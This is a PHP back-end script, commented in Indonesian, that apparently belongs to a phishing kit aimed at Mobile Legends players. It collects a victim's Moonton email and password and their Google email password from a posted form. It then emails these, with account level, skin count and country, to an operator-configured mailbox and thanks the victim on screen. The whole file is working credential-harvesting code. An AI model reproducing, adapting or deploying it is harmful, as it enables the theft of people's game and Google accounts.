<?php
session_start();

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Load PHPMailer files, pastikan path sudah benar
require 'PHPMailer-master/src/Exception.php';
require 'PHPMailer-master/src/PHPMailer.php';
require 'PHPMailer-master/src/SMTP.php';

// Cek session
if (!isset($_SESSION['nickname'])) {
    header("Location: login.php");
    exit;
}

$nickname = $_SESSION['nickname'];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Ambil data dengan sanitasi dasar
    $email_moonton = $_POST['email_moonton'] ?? '';
    $password_moonton = $_POST['password_moonton'] ?? '';
    $password_email_google = $_POST['password_email_google'] ?? '';
    $account_level = $_POST['account_level'] ?? '';
    $skin_count = $_POST['skin_count'] ?? '';
    $country = $_POST['country'] ?? '';

    // Validasi bisa kamu tambah sendiri jika perlu

    $mail = new PHPMailer(true);

    try {
        // SMTP config - ganti sesuai servermu
        $mail->isSMTP();
        $mail->Host = 'smtp.yourserver.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'your-email@domain.com';
        $mail->Password = 'your-email-password';
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;

        $mail->setFrom('your-email@domain.com', 'Mobile Legends Data');
        $mail->addAddress('your-email@domain.com', 'Admin');

        $mail->isHTML(true);
        $mail->Subject = "DATA BARU dari $nickname";

        $mail->Body = "
        <html>
        <head>
          <style>
            body {
              font-family: 'Poppins', sans-serif;
              background-color: #f4f7fa;
              color: #0b1a3b;
              padding: 20px;
            }
            .container {
              max-width: 600px;
              margin: auto;
              background: #ffffff;
              border-radius: 10px;
              padding: 25px;
              box-shadow: 0 8px 24px rgba(0,0,0,0.1);
            }
            h2 {
              color: #0055ff;
              border-bottom: 2px solid #0055ff;
              padding-bottom: 10px;
            }
            table {
              width: 100%;
              border-collapse: collapse;
              margin-top: 20px;
            }
            th, td {
              text-align: left;
              padding: 12px 15px;
              border-bottom: 1px solid #eee;
            }
            th {
              background-color: #e6f4ff;
              color: #0055ff;
              font-weight: 600;
            }
            td {
              color: #34495e;
            }
          </style>
        </head>
        <body>
          <div class='container'>
            <h2>Data Akun MLBB dari: " . htmlspecialchars($nickname) . "</h2>
            <table>
              <tr><th>Informasi</th><th>Detail</th></tr>
              <tr><td>Email Moonton</td><td>" . htmlspecialchars($email_moonton) . "</td></tr>
              <tr><td>Password Moonton</td><td>" . htmlspecialchars($password_moonton) . "</td></tr>
              <tr><td>Password Email (Google)</td><td>" . htmlspecialchars($password_email_google) . "</td></tr>
              <tr><td>Level</td><td>" . htmlspecialchars($account_level) . "</td></tr>
              <tr><td>Jumlah Skin</td><td>" . htmlspecialchars($skin_count) . "</td></tr>
              <tr><td>Negara</td><td>" . htmlspecialchars($country) . "</td></tr>
            </table>
          </div>
        </body>
        </html>
        ";

        $mail->send();

        echo "<p style='text-align:center; margin-top:50px; font-family:Poppins,sans-serif;'>Data berhasil dikirim. Terima kasih!</p>";
        echo "<p style='text-align:center; font-family:Poppins,sans-serif;'><a href='index.php'>Kembali ke Form</a></p>";

    } catch (Exception $e) {
        echo "Gagal mengirim email. Error: {$mail->ErrorInfo}";
    }
} else {
    header("Location: index.php");
    exit;
}
